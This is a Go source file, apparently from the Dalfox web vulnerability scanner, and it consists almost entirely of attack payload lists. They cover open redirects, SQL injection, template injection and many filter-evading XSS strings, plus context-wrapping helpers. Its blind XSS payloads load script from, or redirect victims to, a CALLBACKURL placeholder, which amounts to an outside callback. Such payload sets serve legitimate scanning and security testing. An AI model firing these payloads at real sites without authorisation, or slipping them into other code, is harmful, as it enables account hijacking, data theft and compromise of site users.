package scanning

import "strings"

//basic open redirect payloads
func getOpenRedirectPayload() []string {
	payload := []string{
		"//google.com",
		"//google.com/",
		"//google.com/%2f..",
		"///google.com/%2f..",
		"////google.com/%2f..",
		"https://google.com/%2f..",
		"/https://google.com/%2f..",
		"//www.google.com/%2f%2e%2e",
		"///www.google.com/%2f%2e%2e",
		"////www.google.com/%2f%2e%2e",
		"https://www.google.com/%2f%2e%2e",
		"/https://www.google.com/%2f%2e%2e",
		"//google.com/",
		"///google.com/",
		"////google.com/",
		"https://google.com/",
		"/https://google.com/",
		"//google.com//",
		"///google.com//",
		"////google.com//",
		"https://google.com//",
		"//https://google.com//",
		"//www.google.com/%2e%2e%2f",
		"///www.google.com/%2e%2e%2f",
		"////www.google.com/%2e%2e%2f",
		"https://www.google.com/%2e%2e%2f",
		"//https://www.google.com/%2e%2e%2f",
		"///www.google.com/%2e%2e",
		"////www.google.com/%2e%2e",
		"https:///www.google.com/%2e%2e",
		"//https:///www.google.com/%2e%2e",
		"/https://www.google.com/%2e%2e",
		"///www.google.com/%2f%2e%2e",
		"////www.google.com/%2f%2e%2e",
		"https:///www.google.com/%2f%2e%2e",
		"/https://www.google.com/%2f%2e%2e",
		"/https:///www.google.com/%2f%2e%2e",
		"/%09/google.com",
		"//%09/google.com",
		"///%09/google.com",
		"////%09/google.com",
		"https://%09/google.com",
		"/%5cgoogle.com",
		"//%5cgoogle.com",
		"///%5cgoogle.com",
		"////%5cgoogle.com",
		"https://%5cgoogle.com",
		"/https://%5cgoogle.com",
		"https://google.com",
	}
	return payload
}

//basic sql injection payloads
func getSQLIPayload() []string {
	payload := []string{
		"'",
		"''",
		"`",
		"``",
		",",
		"\"",
		"\"\"",
		"/",
		"//",
		";",
		"' or ",
		"-- or #",
		"' OR '1",
		"' OR 1 -- -",
		" OR \"\" = \"",
		"\" OR 1 = 1 -- -",
		"' OR '' = '",
		"'='",
		"'LIKE'",
		"'=0--+",
		"%00",
		" AND 1",
		" AND 0",
		" AND true",
		" AND false",
		" OR 1=1",
		" OR 1=0",
		" OR 1=1#",
		" OR 1=0#",
		" OR 1=1--",
		" OR 1=0--",
		" HAVING 1=1",
		" HAVING 1=0",
		" HAVING 1=1#",
		" HAVING 1=0#",
		" HAVING 1=1--",
		" HAVING 1=0--",
		" AND 1=1",
		" AND 1=0",
		" AND 1=1--",
		" AND 1=0--",
		" AND 1=1#",
		" AND 1=0#",
		" ORDER BY 1",
	}
	return payload
}

//getSSTIPayload is return SSTI Payloads
func getSSTIPayload() []string {
	payload := []string{
		"{444*6664}",
		"<%=444*6664%>",
		"#{444*6664}",
		"${{444*6664}}",
		"{{444*6664}}",
		"{{= 444*6664}}",
		"<# 444*6664>",
		"{@444*6664}",
		"[[444*6664]]",
		"${{\"{{\"}}444*6664{{\"}}\"}}",
	}
	return payload
}

// getPayloadBoxPayload is use for remote payloads (PortSwigger Cheatsheet)
func getPortswiggerPayload() []string {
	// https://assets.hahwul.com/portswigger-xss.json
	// or https://github.com/TheKingOfDuck/easyXssPayload/raw/master/burpXssPayload.txt
	payload := []string{
		"",
	}
	return payload
}

// getPayloadBoxPayload is use for remote payloads (PayloadBox)
func getPayloadBoxPayload() []string {
	// https://assets.hahwul.com/wl-payloadbox-xss.json
	payload := []string{
		"",
	}
	return payload
}

// getBlindPayload is return Blind XSS Payload
func getBlindPayload() []string {
	payload := []string{
		"\"'><script src=CALLBACKURL></script>",
		"\"'><script src=https://ajax.googleapis.com/ajax/libs/angularjs/1.6.1/angular.min.js></script><div ng-app ng-csp><textarea autofocus ng-focus=\"d=$event.view.document;d.location.hash.match('x1') ? '' : d.location='CALLBACKURL'\"></textarea></div>",
		"javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+document.location=`CALLBACKURL`//'>",
		"\"'><svg onload=\"javascript:eval('d=document; _ = d.createElement(\\'script\\');_.src=\\'CALLBACKURL\\'%3Bd.body.appendChild(_)')\" xmlns=\"http://www.w3.org/2000/svg\"></svg>",
	}
	return payload
}

// getCommonPayload is return xss
func getCommonPayload() []string {
	payload := []string{
		// include verify payload
		"\"><SvG/onload=alert(DALFOX_ALERT_VALUE) id=dalfox>",
		"\"><Svg/onload=alert(DALFOX_ALERT_VALUE) class=dlafox>",
		"'><sVg/onload=alert(DALFOX_ALERT_VALUE) id=dalfox>",
		"'><sVg/onload=alert(DALFOX_ALERT_VALUE) class=dalfox>",
		"</ScriPt><sCripT id=dalfox>alert(DALFOX_ALERT_VALUE)</sCriPt>",
		"</ScriPt><sCripT class=dalfox>alert(DALFOX_ALERT_VALUE)</sCriPt>",
		"\"><a href=javas&#99;ript:alert(DALFOX_ALERT_VALUE)/class=dalfox>click",
		"'><a href=javas&#99;ript:alert(DALFOX_ALERT_VALUE)/class=dalfox>click",
		"'><svg/class='dalfox'onLoad=alert(DALFOX_ALERT_VALUE)>",
		"\"><d3\"<\"/onclick=\" class=dalfox>[confirm``]\"<\">z",
		"\"><w=\"/x=\"y>\"/class=dalfox/ondblclick=`<`[confir\u006d``]>z",
		"\"><iFrAme/src=jaVascRipt:alert(DALFOX_ALERT_VALUE) class=dalfox></iFramE>",
		"\"><svg/class=\"dalfox\"onLoad=alert(DALFOX_ALERT_VALUE)>",
		"\"><svg/OnLoad=\"`${prompt``}`\" class=dalfox>",
		"'\"><img/src/onerror=.1|alert`` class=dalfox>",
		"\"><img/src/onerror=.1|alert`` class=dalfox>",
		"'><img/src/onerror=.1|alert`` class=dalfox>",
		"'\"><svg/class=dalfox onload=&#97&#108&#101&#114&#00116&#40&#41&#x2f&#x2f",
		"</script><svg><script/class=dalfox>alert(DALFOX_ALERT_VALUE)</script>-%26apos;",
		"'\"><iframe srcdoc=\"<input onauxclick=alert(DALFOX_ALERT_VALUE)>\" class=dalfox></iframe>",

		// not include verify payload
		"\"><svg/OnLoad=\"`${prompt``}`\">",
		"'\"><img/src/onerror=.1|alert``>",
		"'><img/src/onerror=.1|alert``>",
		"\"><img/src/onerror=.1|alert``>",
		"'\"><svg/onload=&#97&#108&#101&#114&#00116&#40&#41&#x2f&#x2f",
		"\"><script/\"<a\"/src=data:=\".<a,[].some(confirm)>",
		"\"><script y=\"><\">/*<script* */prompt()</script",
		"<xmp><p title=\"</xmp><svg/onload=alert(DALFOX_ALERT_VALUE)>",
		"\"><d3\"<\"/onclick=\">[confirm``]\"<\">z",
		"\"><a href=\"javascript&colon;alert(DALFOX_ALERT_VALUE)\">click",
		"'><a href='javascript&colon;alert(DALFOX_ALERT_VALUE)'>click",
		"\"><iFrAme/src=jaVascRipt:alert(DALFOX_ALERT_VALUE)></iFramE>",
		"\">asd",
		"'>asd",
	}
	return payload
}

func getHTMLPayload(ip string) []string {
	payload := []string{
		"<sVg/onload=prompt(DALFOX_ALERT_VALUE) class=dalfox>",
		"<Svg/onload=alert(DALFOX_ALERT_VALUE) class=dalfox>",
		"<svG/onload=confirm(DALFOX_ALERT_VALUE) class=dalfox>",
		"<ScRipt class=dalfox>alert(DALFOX_ALERT_VALUE)</script>",
		"<sCriPt class=dalfox>prompt(DALFOX_ALERT_VALUE)</script>",
		"<scRipT class=dalfox>confirm(DALFOX_ALERT_VALUE)</script>",
		"<dETAILS%0aopen%0aonToGgle%0a=%0aa=prompt,a() class=dalfox>",
		"<audio controls ondurationchange=alert(DALFOX_ALERT_VALUE) id=dalfox><source src=1.mp3 type=audio/mpeg></audio>",
		"<div contextmenu=xss><p>1<menu type=context class=dalfox id=xss onshow=alert(DALFOX_ALERT_VALUE)></menu></div>",
		"<iFrAme/src=jaVascRipt:alert(DALFOX_ALERT_VALUE) class=dalfox></iFramE>",
		"<xmp><p title=\"</xmp><svg/onload=alert(DALFOX_ALERT_VALUE) class=dalfox>",
		"<dalfox class=dalfox>",
		"<sVg/onload=prompt(DALFOX_ALERT_VALUE)>",
		"<Svg/onload=alert(DALFOX_ALERT_VALUE)>",
		"<svG/onload=confirm(DALFOX_ALERT_VALUE)>",
		"<ScRipt>alert(DALFOX_ALERT_VALUE)</script>",
		"<sCriPt>prompt(DALFOX_ALERT_VALUE)</script>",
		"<scRipT>confirm(DALFOX_ALERT_VALUE)</script>",
		"<dETAILS%0aopen%0aonToGgle%0a=%0aa=prompt,a()>",
		"<audio controls ondurationchange=alert(DALFOX_ALERT_VALUE)><source src=1.mp3 type=audio/mpeg></audio>",
		"<div contextmenu=xss><p>1<menu type=context onshow=alert(DALFOX_ALERT_VALUE)></menu></div>",
		"<iFrAme/src=jaVascRipt:alert(DALFOX_ALERT_VALUE)></iFramE>",
		"<xmp><p title=\"</xmp><svg/onload=alert(DALFOX_ALERT_VALUE)>",
		"<iframe srcdoc=\"<input onauxclick=alert(DALFOX_ALERT_VALUE)>\" class=dalfox></iframe>",
		"<iframe srcdoc=\"<input onauxclick=prompt(DALFOX_ALERT_VALUE)>\" class=dalfox></iframe>",
		"<iframe srcdoc=\"<input onauxclick=confirm(DALFOX_ALERT_VALUE)>\" class=dalfox></iframe>",
	}
	if strings.Contains(ip, "comment") {
		// TODO add comment payloads
	}
	return payload
}

// getAttrPayload is is return xss
func getAttrPayload(ip string) []string {
	payload := []string{
		"onpointerenter=prompt`DALFOX_ALERT_VALUE` class=dalfox ",
		"onmouseleave=confirm(DALFOX_ALERT_VALUE) class=dalfox ",
	}
	majorHandler := []string{
		"onmouseover",
		"onmouseenter",
		"onmouseleave",
		"onmouseenter",
		"onmouseenter",
		"onpointerover",
		"onpointerdown",
		"onpointerenter",
		"onpointerleave",
		"onpointermove",
		"onpointerout",
		"onpointerup",
		"ontouchstart",
		"ontouchend",
		"ontouchmove",
	}
	for _, mh := range majorHandler {
		payload = append(payload, mh+"=alert(DALFOX_ALERT_VALUE) class=dalfox ")
		payload = append(payload, mh+"=confirm(DALFOX_ALERT_VALUE) class=dalfox ")
		payload = append(payload, mh+"=prompt(DALFOX_ALERT_VALUE) class=dalfox ")
	}

	// set html base payloads
	hp := getHTMLPayload("")
	for _, h := range hp {
		payload = append(payload, ">"+h)
	}

	// Set all event handler base payloads
	// However, the payload must be validated and applied.
	/*
		eh := GetEventHandlers()
		for _, e := range eh {
		payload = append(payload, e+"=alert(DALFOX_ALERT_VALUE) class=dalfox ")
		payload = append(payload, e+"=confirm(DALFOX_ALERT_VALUE) class=dalfox ")
		payload = append(payload, e+"=prompt(DALFOX_ALERT_VALUE) class=dalfox ")
		//}
	*/

	if strings.Contains(ip, "none") {
		return payload
	}
	if strings.Contains(ip, "double") {
		var tempPayload []string
		for _, v := range payload {
			tempPayload = append(tempPayload, "\""+v)
		}
		return tempPayload
	}
	if strings.Contains(ip, "single") {
		var tempPayload []string
		for _, v := range payload {
			tempPayload = append(tempPayload, "'"+v)
		}
		return tempPayload
	}
	return payload
}

func getInJsPayload(ip string) []string {
	payload := []string{
		"alert(DALFOX_ALERT_VALUE)",
		"confirm(DALFOX_ALERT_VALUE)",
		"prompt(DALFOX_ALERT_VALUE)",
		"</sCRipt><sVg/onload=alert(DALFOX_ALERT_VALUE)>",
		"</scRiPt><sVG/onload=confirm(DALFOX_ALERT_VALUE)>",
		"</sCrIpt><SVg/onload=prompt(DALFOX_ALERT_VALUE)>",
		"</sCriPt><ScRiPt>alert(DALFOX_ALERT_VALUE)</sCrIpt>",
		"</scRipT><sCrIpT>confirm(DALFOX_ALERT_VALUE)</SCriPt>",
		"</ScripT><ScRIpT>prompt(DALFOX_ALERT_VALUE)</scRIpT>",
		"window['ale'+'rt'](window['doc'+'ument']['dom'+'ain'])",
		"this['ale'+'rt'](this['doc'+'ument']['dom'+'ain'])",
		"self[(+{}+[])[+!![]]+(![]+[])[!+[]+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]]((+{}+[])[+!![]])",
		"globalThis[(+{}+[])[+!![]]+(![]+[])[!+[]+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]]((+{}+[])[+!![]]);",
		"parent['ale'+'rt'](parent['doc'+'ument']['dom'+'ain'])",
		"top[/al/.source+/ert/.source](/XSS/.source)",
		"frames[/al/.source+/ert/.source](/XSS/.source)",
		"self[/*foo*/'prompt'/*bar*/](self[/*foo*/'document'/*bar*/]['domain'])",
		"this[/*foo*/'alert'/*bar*/](this[/*foo*/'document'/*bar*/]['domain'])",
		"window[/*foo*/'confirm'/*bar*/](window[/*foo*/'document'/*bar*/]['domain'])",
		"{{toString().constructor.constructor('alert(DALFOX_ALERT_VALUE)')()}}",
		"{{-function(){this.alert(DALFOX_ALERT_VALUE)}()}}",
	}
	if strings.Contains(ip, "none") {
		var tempPayload []string
		for _, v := range payload {
			tempPayload = append(tempPayload, ";"+v+";//")
			tempPayload = append(tempPayload, ";"+v+";")
			tempPayload = append(tempPayload, v)
		}
		return tempPayload
	}
	if strings.Contains(ip, "double") {
		var tempPayload []string
		for _, v := range payload {
			tempPayload = append(tempPayload, "\"+"+v+"//")
			tempPayload = append(tempPayload, "\";"+v+"//")
			tempPayload = append(tempPayload, "\"+"+v+"+\"")
			tempPayload = append(tempPayload, "\"-"+v+"-\"")
			tempPayload = append(tempPayload, "\""+v+"\"")

			tempPayload = append(tempPayload, "\\\"+"+v+"//")
			tempPayload = append(tempPayload, "\\\";"+v+"//")
			tempPayload = append(tempPayload, "\\\"+"+v+"+\"")
			tempPayload = append(tempPayload, "\\\"-"+v+"-\"")
			tempPayload = append(tempPayload, "\\\""+v+"\"")
		}
		return tempPayload
	}
	if strings.Contains(ip, "single") {
		var tempPayload []string
		for _, v := range payload {
			tempPayload = append(tempPayload, "'+"+v+"//")
			tempPayload = append(tempPayload, "';"+v+"//")
			tempPayload = append(tempPayload, "'+"+v+"+'")
			tempPayload = append(tempPayload, "'-"+v+"-'")
			tempPayload = append(tempPayload, "'"+v+"'")

			tempPayload = append(tempPayload, "\\'+"+v+"//")
			tempPayload = append(tempPayload, "\\';"+v+"//")
			tempPayload = append(tempPayload, "\\'+"+v+"+'")
			tempPayload = append(tempPayload, "\\'-"+v+"-'")
			tempPayload = append(tempPayload, "\\'"+v+"'")
		}
		return tempPayload
	}
	if strings.Contains(ip, "backtick") {
		var tempPayload []string
		for _, v := range payload {
			tempPayload = append(tempPayload, "${"+v+"}")
		}
		return tempPayload
	}
	return payload

}
